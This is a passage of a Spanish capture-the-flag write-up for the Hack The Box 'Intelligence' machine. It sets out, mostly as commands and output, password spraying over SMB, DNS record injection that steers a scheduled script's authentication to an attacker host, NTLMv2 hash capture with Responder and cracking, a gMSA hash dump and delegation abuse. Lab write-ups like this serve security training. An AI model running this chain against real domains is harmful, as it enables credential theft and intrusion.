+       │ File: 2020-06-04-upload.txt
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ New Account Guide
+   2   │ Welcome to Intelligence Corp!
+   3   │ Please login using your username and the default password of:
+   4   │ NewIntelligenceCorpUser9876
+   5   │ After logging in please change your password as soon as possible.
+   6   │ 
+   7   │ ^L
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+<h2 id="smb">SMB</h2>
+<ul>
+<li>Como tenemos una contraseña podemos usar <code>crackmapexec</code> para saber de quien es la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.10.10.248 -u users.txt -p 'NewIntelligenceCorpUser9876'
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+</code></pre></div></div>
+<ul>
+<li>Tenemos credenciales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ /bin/cat creds.txt
+Tiffany.Molina:NewIntelligenceCorpUser9876 
+</code></pre></div></div>
+<ul>
+<li>Las credenciales son para el protocolo <code>SMB</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p &quot;NewIntelligenceCorpUser9876&quot;
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+</code></pre></div></div>
+<ul>
+<li><p>Como tenemos credenciales validas podemos probar un Kerberoasting Attack para solicitar un <code>TGS</code> <a href="https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast</a>.</p>
+</li>
+<li><p>Pero no es vulnerable.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ impacket-GetUserSPNs intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+No entries found!
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li>Podemos enumerar por <code>SMB</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --no-banner
+[\] Checking for open ports...                                                                                                  [|] Checking for open ports...                                                                                                  [/] Checking for open ports...                                                                                                  [-] Checking for open ports...                                                                                                  [*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 10.10.10.248:445	Name: dc.intelligence.htb 	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	IT                                                	READ ONLY	
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+[*] Closed 1 connections                                                                        
+</code></pre></div></div>
+<ul>
+<li>Vamos a ver que es lo que hay dentro de Users.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient -U Tiffany.Molina //10.10.10.248/Users
+Password for [WORKGROUP\Tiffany.Molina]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                  DR        0  Sun Apr 18 20:20:26 2021
+  ..                                 DR        0  Sun Apr 18 20:20:26 2021
+  Administrator                       D        0  Sun Apr 18 19:18:39 2021
+  All Users                       DHSrn        0  Sat Sep 15 02:21:46 2018
+  Default                           DHR        0  Sun Apr 18 21:17:40 2021
+  Default User                    DHSrn        0  Sat Sep 15 02:21:46 2018
+  desktop.ini                       AHS      174  Sat Sep 15 02:11:27 2018
+  Public                             DR        0  Sun Apr 18 19:18:39 2021
+  Ted.Graves                          D        0  Sun Apr 18 20:20:26 2021
+  Tiffany.Molina                      D        0  Sun Apr 18 19:51:46 2021
+
+		3770367 blocks of size 4096. 1437659 blocks available
+smb: \&gt; 
+</code></pre></div></div>
+<ul>
+<li>Vemos la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">smb: \&gt; cd Tiffany.Molina\
+smb: \Tiffany.Molina\&gt; dir
+  .                                   D        0  Sun Apr 18 19:51:46 2021
+  ..                                  D        0  Sun Apr 18 19:51:46 2021
+  AppData                            DH        0  Sun Apr 18 19:51:46 2021
+  Application Data                DHSrn        0  Sun Apr 18 19:51:46 2021
+  Cookies                         DHSrn        0  Sun Apr 18 19:51:46 2021
+  Desktop                            DR        0  Sun Apr 18 19:51:46 2021
+  Documents                          DR        0  Sun Apr 18 19:51:46 2021
+  Downloads                          DR        0  Sat Sep 15 02:12:33 2018
+  Favorites                          DR        0  Sat Sep 15 02:12:33 2018
+  Links                              DR        0  Sat Sep 15 02:12:33 2018
+  Local Settings                  DHSrn        0  Sun Apr 18 19:51:46 2021
+  Music                              DR        0  Sat Sep 15 02:12:33 2018
+  My Documents                    DHSrn        0  Sun Apr 18 19:51:46 2021
+  NetHood                         DHSrn        0  Sun Apr 18 19:51:46 2021
+  NTUSER.DAT                        AHn   131072  Sun Aug 11 17:42:51 2024
+  ntuser.dat.LOG1                   AHS    86016  Sun Apr 18 19:51:46 2021
+  ntuser.dat.LOG2                   AHS        0  Sun Apr 18 19:51:46 2021
+  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf    AHS    65536  Sun Apr 18 19:51:46 2021
+  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Apr 18 19:51:46 2021
+  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Apr 18 19:51:46 2021
+  ntuser.ini                        AHS       20  Sun Apr 18 19:51:46 2021
+  Pictures                           DR        0  Sat Sep 15 02:12:33 2018
+  Recent                          DHSrn        0  Sun Apr 18 19:51:46 2021
+  Saved Games                         D        0  Sat Sep 15 02:12:33 2018
+  SendTo                          DHSrn        0  Sun Apr 18 19:51:46 2021
+  Start Menu                      DHSrn        0  Sun Apr 18 19:51:46 2021
+  Templates                       DHSrn        0  Sun Apr 18 19:51:46 2021
+  Videos                             DR        0  Sat Sep 15 02:12:33 2018
+
+		3770367 blocks of size 4096. 1437659 blocks available
+smb: \Tiffany.Molina\&gt; cd Desktop
+smb: \Tiffany.Molina\Desktop\&gt; dir
+  .                                  DR        0  Sun Apr 18 19:51:46 2021
+  ..                                 DR        0  Sun Apr 18 19:51:46 2021
+  user.txt                           AR       34  Sun Aug 11 17:33:28 2024
+
+		3770367 blocks of size 4096. 1437643 blocks available
+smb: \Tiffany.Molina\Desktop\&gt; get user.txt
+getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \Tiffany.Molina\Desktop\&gt; 
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat user.txt
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: user.txt
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ d07ff52158e75818a204e25d39744c93
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+<h2 id="shell-as-nt-authority-system-and-root-flag">Shell as nt authority system and root flag</h2>
+<ul>
+<li>Si seguimos enumerando encontramos un script en powershell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient -U Tiffany.Molina //10.10.10.248/IT
+Password for [WORKGROUP\Tiffany.Molina]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Apr 18 19:50:55 2021
+  ..                                  D        0  Sun Apr 18 19:50:55 2021
+  downdetector.ps1                    A     1046  Sun Apr 18 19:50:55 2021
+
+		3770367 blocks of size 4096. 1437627 blocks available
+smb: \&gt; get downdetector.ps1 
+getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (2.4 KiloBytes/sec) (average 2.4 KiloBytes/sec)
+</code></pre></div></div>
+<ul>
+<li>Este script lo que esta haciendo es acceder a LDAP y obtiene una lista de todas las computadoras, luego recorre aquellas cuyo nombre comienza con &quot;web&quot;. Intentará realizar una solicitud web a ese servidor (usando las credenciales del usuario en ejecución), y si el código de estado no es 200, enviará un correo electrónico a Ted.Graves para informarle que el host está caído. El comentario al principio indica que está programado para ejecutarse cada cinco minutos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat downdetector.ps1
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: downdetector.ps1   &lt;UTF-16LE&gt;
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ # Check web server status. Scheduled to run every 5min
+   2   │ Import-Module ActiveDirectory 
+   3   │ foreach($record in Get-ChildItem &quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot; | Wh
+       │ ere-Object Name -like &quot;web*&quot;)  {
+   4   │ try {
+   5   │ $request = Invoke-WebRequest -Uri &quot;http://$($record.Name)&quot; -UseDefaultCredentials
+   6   │ if(.StatusCode -ne 200) {
+   7   │ Send-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -Subje
+       │ ct &quot;Host: $($record.Name) is down&quot;
+   8   │ }
+   9   │ } catch {}
+  10   │ }
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+<ul>
+<li>Podemos robar un hash con esta herramienta para inyectar un record <a href="https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py">https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python3 dnstool.py
+usage: dnstool.py [-h] [-u USERNAME] [-p PASSWORD] [--forest] [--legacy] [--zone ZONE] [--print-zones] [--tcp] [-k]
+                  [-port port] [-force-ssl] [-dc-ip ip address] [-dns-ip ip address] [-aesKey hex key] [-r TARGETRECORD]
+                  [-a {add,modify,query,remove,resurrect,ldapdelete}] [-t {A}] [-d RECORDDATA] [--allow-multiple] [--ttl TTL]
+                  HOSTNAME
+dnstool.py: error: the following arguments are required: HOSTNAME
+</code></pre></div></div>
+<ul>
+<li>Vamos a poner que el nombre que comienza con web para que todo funcione.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webmiguel -a add -t A -d 10.10.14.30 10.10.10.248
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+</code></pre></div></div>
+<ul>
+<li>Vamos a capturar el trafico como ya se inyecto el DNS record y se ejecute el script la autenticación ira hacia nosotros y vamos a ver el hash del usuario.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo responder -I tun0
+</code></pre></div></div>
+<ul>
+<li>Después de unos minutos nos llega el hash.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo responder -I tun0
+[sudo] password for miguelrega7: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -&gt; https://github.com/sponsors/lgandx
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.30]
+    Responder IPv6             [dead:beef:2::101c]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-Z9A9SBGSGZR]
+    Responder Domain Name      [1RV7.LOCAL]
+    Responder DCE-RPC Port     [45229]
+
+[+] Listening for events...
+
+               
+[HTTP] NTLMv2 Client   : 10.10.10.248
+[HTTP] NTLMv2 Username : intelligence\Ted.Graves
+[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:6260985d3bd0347a:615B680BCA6559DEAB2A1A811C5F50AB:01010000000000002D4C359475ECDA0198F61145958356E00000000002000800310052005600370001001E00570049004E002D005A00390041003900530042004700530047005A0052000400140031005200560037002E004C004F00430041004C0003003400570049004E002D005A00390041003900530042004700530047005A0052002E0031005200560037002E004C004F00430041004C000500140031005200560037002E004C004F00430041004C000800300030000000000000000000000000200000F9E145FD22ACC32AA1C9D74B89FF7116BCD9740D7EA44791204DE1C72F2FEF6E0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062006D0069006700750065006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+</code></pre></div></div>
+<ul>
+<li>Vemos la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ john -w:/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+No password hashes left to crack (see FAQ)
+                                                                                                                                
+❯ john --show hash.txt
+Ted.Graves:Mr.Teddy:intelligence:6260985d3bd0347a:615B680BCA6559DEAB2A1A811C5F50AB:01010000000000002D4C359475ECDA0198F61145958356E00000000002000800310052005600370001001E00570049004E002D005A00390041003900530042004700530047005A0052000400140031005200560037002E004C004F00430041004C0003003400570049004E002D005A00390041003900530042004700530047005A0052002E0031005200560037002E004C004F00430041004C000500140031005200560037002E004C004F00430041004C000800300030000000000000000000000000200000F9E145FD22ACC32AA1C9D74B89FF7116BCD9740D7EA44791204DE1C72F2FEF6E0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062006D0069006700750065006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+
+1 password hash cracked, 0 left
+                                                                                         
+</code></pre></div></div>
+<ul>
+<li>Las credenciales son correctas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'
+SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
+</code></pre></div></div>
+<ul>
+<li>Vamos a usar <code>bloodhound</code> para enumerar el dominio y ver vías de escalar privilegios y obtener una shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
+INFO: Found AD domain: intelligence.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Connecting to LDAP server: dc.intelligence.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to GC LDAP server: dc.intelligence.htb
+INFO: Connecting to LDAP server: dc.intelligence.htb
+INFO: Found 43 users
+INFO: Found 55 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.intelligence.htb
+INFO: Done in 00M 29S
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo neo4j console
+</code></pre></div></div>
+<ul>
+<li>Una vez hacemos todo el proceso de neo4j ejecutamos el <code>bloodhound</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ bloodhound &amp;&gt; /dev/null &amp;
+[1] 96907
+</code></pre></div></div>
+<ul>
+<li>Nosotros como el usuario <code>Ted.Graves</code> podemos ver la contraseña de <code>SVC_INT</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/intelligence/4.png">
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/intelligence/5.png">
+</p>
+
+<ul>
+<li>Podemos usar la siguiente herramienta <a href="https://github.com/micahvandeusen/gMSADumper">https://github.com/micahvandeusen/gMSADumper</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb
+Users or groups who can read password for svc_int$:
+ &gt; DC$
+ &gt; itsupport
+svc_int$:::4c395675187a74271de7c4af867ad417
+svc_int$:aes256-cts-hmac-sha1-96:cd87c9ddd67ecee7f918e83fc5506eb1cd8f8d114a4c2e763ae0340c949a777c
+svc_int$:aes128-cts-hmac-sha1-96:541f7fe57df7994bbf6d0312a8849f94
+</code></pre></div></div>
+<ul>
+<li>Tenemos el privilegio de <code>AllowedToDelegate</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/intelligence/6.png">
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/intelligence/7.png">
+</p>
+
+<ul>
+<li>Podemos usar esta herramienta de <code>impacket</code> para el <code>impersonate</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ impacket-getST -h
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+usage: getST.py [-h] [-spn SPN] [-altservice ALTSERVICE]
+                [-impersonate IMPERSONATE]
+                [-additional-ticket ticket.ccache] [-ts]
+                [-debug] [-u2u] [-self]
+                [-force-forwardable]
+                [-hashes LMHASH:NTHASH] [-no-pass] [-k]
+                [-aesKey hex key] [-dc-ip ip address]
+                identity
+
+Given a password, hash or aesKey, it will request a
+Service Ticket and save it as ccache
+
+positional arguments:
+  identity              [domain/]username[:password]
+
+options:
+  -h, --help            show this help message and exit
+  -spn SPN              SPN (service/server) of the
+                        target service the service
+                        ticket will be generated for
+  -altservice ALTSERVICE
+                        New sname/SPN to set in the
+                        ticket
+  -impersonate IMPERSONATE
+                        target username that will be
+                        impersonated (thru S4U2Self) for
+                        quering the ST. Keep in mind
+                        this will only work if the
+                        identity provided in this
+                        scripts is allowed for
+                        delegation to the SPN specified
